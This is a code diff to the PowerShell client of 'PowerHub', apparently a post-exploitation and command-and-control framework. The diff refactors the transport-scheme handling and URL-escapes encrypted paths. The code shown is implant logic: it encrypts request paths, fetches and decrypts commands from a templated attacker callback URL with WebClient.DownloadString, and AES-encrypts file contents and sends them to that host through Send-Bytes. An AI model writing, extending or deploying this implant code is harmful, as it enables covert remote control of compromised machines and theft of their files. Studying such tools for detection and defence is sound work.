@@ -11,10 +11,11 @@ Run 'Help-PowerHub' for help
 
 $KEY = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
 $CALLBACK_URL = "{{callback_url}}"
-$CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
 $WebClient = New-Object Net.WebClient
-
+$TransportScheme = "{{transport}}"
 $WEBDAV_URL = "{{webdav_url}}"
+
+$CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
@@ -91,10 +92,11 @@ function Decrypt-String {
 
 function Transport-String {
     param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
-    $args = "?t={{transport}}"
+    $args = "?t=$TransportScheme"
     foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
     $path = "${1}${args}"
     $path = Encrypt-String $path
+    $path = [uri]::EscapeDataString($path)
     return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${path}")) $3
 }
 
@@ -639,7 +641,7 @@ function Send-Bytes {
     {{'Write-Debug "Encrypting $Filename..."'|debug}}
     $Body = (Encrypt-AES $Body $KEY)
 
-    if ("{{transport}}" -match "^https?$") {
+    if ($TransportScheme -match "^https?$") {
         Send-BytesViaHttp $Body $FileName
     }
 }
